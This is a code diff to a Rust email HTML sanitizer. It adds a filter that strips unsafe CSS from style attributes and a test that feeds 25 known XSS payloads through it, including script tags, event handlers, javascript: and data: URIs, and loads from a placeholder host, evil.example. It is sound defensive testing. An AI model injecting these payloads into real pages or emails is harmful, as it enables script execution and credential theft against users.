@@ -139,8 +139,34 @@ pub fn sanitize_html(html: &str) -> String {
         .add_generic_attributes(attrs)
         .add_tags(["font", "center"])
         .link_rel(Some("noopener noreferrer"))
+        .attribute_filter(|_, attribute, value| {
+            // Script in CSS is dead in today's engines and the CSP blocks
+            // loads anyway, but there is no reason to keep it around.
+            if attribute == "style" && unsafe_css(value) {
+                None
+            } else {
+                Some(value.into())
+            }
+        })
         .clean(html)
         .to_string()
+}
+
+fn unsafe_css(style: &str) -> bool {
+    let s: String = style
+        .chars()
+        .filter(|c| !c.is_whitespace() && *c != '\\')
+        .flat_map(char::to_lowercase)
+        .collect();
+    [
+        "javascript:",
+        "vbscript:",
+        "expression(",
+        "behavior:",
+        "-moz-binding",
+    ]
+    .iter()
+    .any(|bad| s.contains(bad))
 }
 
 /// View-time document for the sandboxed iframe. The CSP blocks every network
@@ -227,5 +253,66 @@ mod tests {
         assert!(doc.contains("default-src 'none'"));
         let doc = html_document(&clean, true);
         assert!(doc.contains("t.example"));
+    }
+
+    /// Known XSS payloads: whatever survives sanitizing must be inert, since
+    /// the iframe allows scripts (for our click listener) and only the CSP
+    /// and this sanitizer stand between an email and code execution.
+    #[test]
+    fn xss_vectors_are_inert() {
+        let vectors = [
+            "<script>alert(1)</script>",
+            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            "<svg><script>alert(1)</script></svg>",
+            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+            "<a href=\"javascript:alert(1)\">x</a>",
+            "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
+            "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
+            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
+            "<a href=\"vbscript:msgbox(1)\">x</a>",
+            "<iframe src=\"https://evil.example\"></iframe>",
+            "<object data=\"x.swf\"></object><embed src=\"x.swf\">",
+            "<form action=\"https://evil.example\"><input name=p></form>",
+            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
+            "<base href=\"https://evil.example/\">",
+            "<link rel=stylesheet href=\"https://evil.example/x.css\">",
+            "<style>@import url(https://evil.example/x.css)</style>",
+            "<div style=\"background:url(javascript:alert(1))\">x</div>",
+            "<p onmouseover=\"alert(1)\">x</p>",
+            "<body onload=alert(1)>",
+            "<details open ontoggle=alert(1)>",
+            "<!--<script>-->alert(1)<!--</script>-->",
+            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+            "<template><script>alert(1)</script></template>",
+        ];
+        for v in vectors {
+            let doc = html_document(&sanitize_html(v), true);
+            let body = doc.split("</head>").nth(1).unwrap_or(&doc).to_lowercase();
+            for bad in [
+                "<script",
+                "javascript:",
+                "vbscript:",
+                "onerror",
+                "onload",
+                "onclick",
+                "onmouseover",
+                "ontoggle",
+                "<iframe",
+                "<object",
+                "<embed",
+                "<form",
+                "<meta",
+                "<base",
+                "<link",
+                "data:text/html",
+            ] {
+                assert!(!body.contains(bad), "{bad:?} survived {v:?}: {body}");
+            }
+        }
+        // every rendered document carries the CSP that blocks scripts
+        let doc = html_document("<p>x</p>", true);
+        assert!(doc.contains("default-src 'none'") && !doc.contains("script-src"));
     }
 }
